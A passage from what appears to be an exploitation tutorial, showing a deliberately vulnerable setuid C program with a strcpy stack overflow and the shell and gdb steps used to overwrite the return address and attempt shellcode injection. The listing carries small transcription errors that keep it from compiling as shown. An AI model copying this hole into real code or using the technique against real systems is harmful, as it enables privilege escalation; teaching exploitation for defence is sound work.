Sometimes a program will place certain restrictions on buffers
This type of data sanity-checking can prevent many vulnerabilities
Consider the following example program, which is used to update product descriptions in a fictitious database
The first argument is the product code, and the second is the updated description
This program doesn't actually update a database, but it does have an obvious vulnerability in it

update_info.c
__________________________________________________________________________________
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MAX_ID_LEN 40
#define MAX_DESC_LEN 500

/* Barf a message and exit. */
void barf(char *message, void *extra) {
   printf(message, extra);
   exit(1);
}

/* Pretend this function updates a product description in a databse.*/
void update_product_description(char *id, char *desc)
{
   char product_code[5], description[MAX_DESC_LEN];

   printf("[DEBUG]: description is at %p\n", description);

   strncpy(description, desc, MAX_DESC_LEN);
   strcpy(product_code, id);

   printf("Updating product #%s with description \'%s\'\n", product_code, desc);
   // Update database
}

int main(int argc, char *argv[], char *envp[])
{
   int i;
   char *id, *desc;

   if(argc < 2)
      barf("Usage: %s <id> <description>\n", argv[0]);
   id = argv[1];   // id - Product code to update in DB
   desc = argv[2]; // desc - Item description to update

   if(strlen(id) > MAX_ID_LEN) // id must be less than MAX_ID_LEN bytes
      barf("Fatal: id argument must be less than %u bytes\n", (void *)MAX_ID_LEN)

   for(i=0; i < strlen(desc)-1; i++) { // Only allow printable bytes in desc
      if(!(isprint(desc[i])))
         barf("Fatal: description argument can only contain printable bytes\n", NULL);
   }

   // Clearing out the stack memory (security)
   // Clearing all arguments except the first and second
   memset(argv[0], 0, strlen(argv[0]));
   for(i=3; argv[i] != 0; i++)
      memset(argv[i], 0, strlen(argv[i]));
   // Clearing all environment variables
   for(i=0; envp[i] != 0, i++)
      memset(envp[i], 0, strlen(envp[i]));

   printf("[DEBUG]: desc is at %p\n", desc);

   update_product_description(id, desc);
}
__________________________________________________________________________________

Despite the vulnerability, the code does make an attempt at security
The length of the product ID argument is restricted, and the contents of the description argument are limited to printable characters
In addition, the unused environment variables and program arguments are cleared out for security reasons
The first argumetn (id) is too small for shellcode, and since the rest of the stack memory is cleared out, there's only one place left

__________________________________________________________________________________
reader@hacking:~/booksrc $ gcc -o update_info update_info.c
reader@hacking:~/booksrc $ sudo chown root ./update_info
reader@hacking:~/booksrc $ sudo chmod u+s ./update_info
reader@hacking:~/booksrc $ ./update_info
Usage: ./update_info <id> <description>
reader@hacking:~/booksrc $ ./update_info OCP209 "Enforcement Droid"
[DEBUG]: description is at 0xbffff650
Updating product #OCP209 with description 'Enforcement Droid'

reader@hacking:~/booksrc $ ./update_info $(perl -e 'print "AAAA"x10') blah
[DEBUG]: description is at 0xbffff650
Segmentation fault

reader@hacking:~/booksrc $ ./update_info $(perl -e 'print "\xf2\xf9\xff\xbf"x10') $(cat ./
shellcode.bin)
Fatal: description argument can only contain printable bytes
__________________________________________________________________________________

The output shows a sample usage and then tries to exploit the vulnerable strcpy() call
Although the return address can be overwritten using the first argument(id), the only place we can put the shellcode is in the second argument (desc)
However, this buffer is checked for nonprintable bytes
The debugging output below shows that this program could be exploited, if there was a way to put shellcode in the description argument

__________________________________________________________________________________
reader@hacking:~/booksrc $ gdb -q ./update_info
Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".

(gdb) run $(perl -e 'print "\xcb\xf9\xff\xbf"x10') blah
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/reader/booksrc/update_info $(perl -e 'print "\xcb\xf9\xff\xbf"x10')
blah
[DEBUG]: desc is at 0xbffff9cb
Updating product # with description 'blah'

Program received signal SIGSEGV, Segmentation fault.
0xbffff9cb in ?? ()
(gdb) i r eip
eip           0xbffff9cb           0xbffff9cb

(gdb) x/s $eip
0xbffff9cb:     "blah"
__________________________________________________________________________________

The printable input validation is the only thing stopping exploitation
Like airport security, this input validation loop inspects everything coming in
And while it's not possible to avoid this check, there are ways to smuggle illicit data past the guards